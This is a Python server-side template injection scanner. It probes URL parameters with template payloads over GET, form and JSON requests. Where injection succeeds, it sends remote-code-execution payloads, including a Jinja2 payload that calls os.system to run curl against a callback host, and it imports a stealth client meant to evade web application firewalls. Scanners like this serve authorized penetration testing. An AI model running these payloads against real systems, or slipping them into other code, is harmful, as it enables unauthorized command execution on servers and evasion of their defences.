#!/usr/bin/env python3
"""Template Injection Tester

Tests for Server-Side Template Injection (SSTI):
- Jinja2
- Freemarker
- Velocity
- Smarty
"""

from typing import Dict, Any, Optional, List

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)



def test_ssti(target_url: str, param: str = "q", callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test for SSTI vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        callback_url: Optional callback URL for RCE validation
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "ssti",
        "test": "ssti",
        "vulnerable": False,
        "url": target_url,  # Include URL for detection matching
        "param": param,  # Include parameter name in result
        "template_engine": None,
        "evidence": None
    }
    
    # Template engine detection payloads
    payloads = {
        "jinja2": "{{7*7}}",
        "freemarker": "${7*7}",
        "velocity": "#set($x=7*7)$x",
        "smarty": "{7*7}",
    }
    
    def try_request(method: str, payload: str) -> Optional[requests.Response]:
        """Try a request with the given method and payload."""
        try:
            if method == "GET":
                return requests.get(
                    target_url,
                    params={param: payload},
                    timeout=10
                )
            elif method == "POST_FORM":
                return requests.post(
                    target_url,
                    data={param: payload},
                    timeout=10
                )
            elif method == "POST_JSON":
                return requests.post(
                    target_url,
                    json={param: payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
        except Exception:
            return None
        return None
    
    # Try different HTTP methods
    methods = ["GET", "POST_FORM", "POST_JSON"]
    
    for engine, payload in payloads.items():
        for method in methods:
            resp = try_request(method, payload)
            if resp is None:
                continue
            
            # Check if expression evaluated
            if "49" in resp.text:
                result["vulnerable"] = True
                result["template_engine"] = engine
                result["method"] = method
                result["evidence"] = {
                    "payload": payload,
                    "method": method,
                    "response_snippet": resp.text[:500]
                }
                break
        
        if result["vulnerable"]:
            break
    
    # If vulnerable, test RCE
    if result["vulnerable"] and callback_url:
        rce_payloads = {
            "jinja2": f"{{{{config.__class__.__init__.__globals__['os'].system('curl {callback_url}')}}}}",
            "freemarker": f"${{new java.net.URL('{callback_url}').openConnection()}}",
        }
        
        engine = result["template_engine"]
        method = result.get("method", "GET")
        if engine in rce_payloads:
            resp = try_request(method, rce_payloads[engine])
            if resp:
                result["rce_tested"] = True
    
    return result


def test_ssti_params(
    target_url: str,
    params: Optional[List[str]] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test multiple parameters for SSTI
    
    Args:
        target_url: Target URL
        params: List of parameters to test (if None, will discover)
        callback_url: Optional callback URL
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "ssti_multi_param",
        "vulnerable": False,
        "findings": []
    }
    
    # Discover parameters if not provided
    if not params:
        from tools.rest_api_fuzzer import discover_parameters
        discovered_params = discover_parameters(target_url)
        # Always include common SSTI parameter names (name is very common for template vars)
        ssti_params = ["name", "q", "query", "search", "template", "render", "page", "view", "content", "text", "msg", "message", "input", "data", "value"]
        params = list(set(discovered_params + ssti_params))
    
    # Test each parameter
    for param in params:
        test_result = test_ssti(target_url, param=param, callback_url=callback_url)
        if test_result["vulnerable"]:
            result["vulnerable"] = True
            # Ensure URL and param are included in finding for detection matching
            if "url" not in test_result:
                test_result["url"] = target_url
            if "param" not in test_result:
                test_result["param"] = param
            result["findings"].append(test_result)
    
    return result

